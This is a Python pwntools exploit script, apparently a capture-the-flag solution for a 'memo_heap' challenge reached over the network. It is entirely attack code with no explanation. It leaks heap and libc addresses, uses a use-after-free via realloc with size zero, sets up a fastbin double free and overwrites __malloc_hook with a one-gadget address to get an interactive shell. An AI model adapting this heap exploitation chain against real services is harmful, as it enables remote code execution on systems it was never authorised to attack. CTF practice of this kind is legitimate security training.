#-*- coding: utf-8 -*-
from pwn import *

def create(size, name):
    r.sendline('1')
    r.sendlineafter('? ', str(size))
    r.sendafter(': ', name)
    r.recvuntil('choice: ')

def edit(idx, name):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', name)
    r.recvuntil('choice: ')

def show(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(':\n')
    name = r.recvuntil('\n', drop=True)
    size = r.recvuntil('\n', drop=True)
    state = r.recvuntil('\n', drop=True)
    r.recvuntil('choice: ')
    return name

def delete(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil('choice: ', timeout=1)

libc = ELF('./memoheap_libc.so.6')
# r = process('./memo_heap', env={'LD_PRELOAD': './memoheap_libc.so.6'})
# print 'pid :', pidof(r)
r= remote('memoheap.acebear.site', 3003)

r.recvuntil('choice: ')

# leak (heap, libc)
create(0x80, 'A' * 8)
create(0x80, 'A' * 8)
create(0x80, 'A' * 8)

delete(0)
delete(1)

create(0x80, 'A' * 8)
create(0x80, 'A')

heap = u64('\x00' + show(0)[-5:] + '\x00\x00') # heap leak
leak = u64(show(1)[-6:] + '\x00\x00') # libc leak

libc.address = leak - 0x41 - 0x3c4b00
one_shot = libc.address + 0xf0274

log.info('heap : ' + hex(heap))
log.info('libc_base : ' + hex(libc.address))
log.info('one_shot : ' + hex(one_shot))

# make empty space
delete(0)
delete(1)
delete(2)

# UAF
create(0, '')
create(0, '')

edit(0, '') # free(0->name)
edit(1, '') # free(1->name)

create(0x10, 'A' * 16)

delete(1)

payload  = p64(heap + 0x1a0) # name : heap + 0x1a0 ( 6->name )
payload += p32(0) # size : 0 (for free)
payload += p32(2) # state : 2 (for fastbin_dup)
create(0x10, payload) # 2 == 1->name

# one more time
create(0, '')
create(0, '')

edit(3, '') # realloc(ptr, 0) => free(ptr)
edit(4, '') # realloc(ptr, 0) => free(ptr)

create(0x10, 'B' * 16)

delete(4)

payload  = p64(heap + 0x220) # name : heap + 0x220 ( 7->name )
payload += p32(0) # size : 0 (for free)
payload += p32(1) # state : 1
create(0x10, payload) # 5 == 4->name

# make two fake chunks
payload  = 'Z' * 8
payload += p64(0x71)

create(0x70, payload) # 6
create(0x70, payload) # 7

# make empty space
delete(0)
delete(3)

# fastbin_dup
edit(2, '') # free 6
edit(5, '') # free 7 
edit(2, '') # free 6

edit(6, 'Z' * 8 + p64(0x71) + p64(libc.symbols['__malloc_hook'] - 0x23))

create(0x60, 'A')

payload  = '\x00' * 3
payload += p64(0) * 2
payload += p64(one_shot)
create(0x60, payload)

r.sendline('1')
r.sendline('1')

r.interactive()
